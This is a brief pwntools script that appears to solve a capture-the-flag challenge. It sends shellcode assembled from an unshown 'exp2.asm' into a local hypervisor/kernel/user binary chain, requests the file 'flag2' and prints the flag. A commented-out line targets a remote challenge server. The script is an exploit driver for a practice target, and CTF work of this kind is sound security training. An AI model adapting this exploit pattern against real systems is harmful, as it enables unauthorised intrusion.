from pwn import *
from assembler import assemble # This was my assembler code

code = assemble('exp2.asm')

#p = remote('35.200.23.198', 31733)
p = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'])
p.sendline(code)
p.recvuntil('Please enter filename to open:\0')
p.send('flag2\0')
print('The flag is ' + p.recvline())
